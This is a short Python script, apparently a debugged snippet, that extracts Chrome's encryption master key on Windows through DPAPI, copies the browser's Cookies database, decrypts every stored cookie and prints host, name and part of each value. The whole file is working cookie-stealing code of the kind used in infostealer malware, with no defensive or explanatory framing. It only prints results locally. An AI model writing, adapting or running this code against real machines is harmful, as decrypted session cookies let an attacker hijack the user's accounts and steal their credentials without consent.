import os, json, base64, shutil, sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

base_path = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data")
cookies_path = os.path.join(base_path, "Default", "Network", "Cookies")
local_state_path = os.path.join(base_path, "Local State")

def get_master_key():
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt(buff, master_key):
    if buff[:3] in (b'v10', b'v20'):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode(errors='ignore')
    else:
        return CryptUnprotectData(buff, None, None, None, 0)[1].decode(errors='ignore')

if os.path.exists(cookies_path):
    shutil.copy2(cookies_path, "TempCookies.db")
    master_key = get_master_key()
    conn = sqlite3.connect("TempCookies.db")
    conn.text_factory = bytes  # <-- This is the fix!
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for row in cursor.fetchall():
        host, name, encrypted_value = row
        host = host.decode(errors='ignore') if isinstance(host, bytes) else host
        name = name.decode(errors='ignore') if isinstance(name, bytes) else name
        value = decrypt(encrypted_value, master_key)
        print(f"{host} | {name} | {value[:10]}...")
    cursor.close()
    conn.close()
    os.remove("TempCookies.db")
else:
    print("No cookies DB found.")